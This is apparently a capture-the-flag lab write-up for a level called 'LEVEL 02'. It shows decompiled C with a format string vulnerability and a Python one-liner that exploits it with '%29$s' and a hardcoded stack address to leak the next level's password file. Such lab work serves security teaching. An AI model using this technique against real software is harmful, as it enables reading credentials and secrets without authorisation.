# LEVEL 02

* decompile the binary
	- we found a string formatting vulnerability.
		```
		fgets(local_78,100,stdin);
		...
		printf(local_78);
		```
	- we know the flag is being written to the stack
		```
		local_10 = fopen("/home/users/level03/.pass","r");
		...
		fread(local_a8,1,41,local_10);
		```

* to exploit the vulnerability:
	- type the command:
		```
		python -c 'from struct import *; print "%29$s   " + pack("L", 0x7fffffffe510) ' | ./level02
		```
-------
### explinations:
- `0x7fffffffe510` : the flag address in the stack
- `29 in "%29$s"` : index of where the flag addres is located in the stack
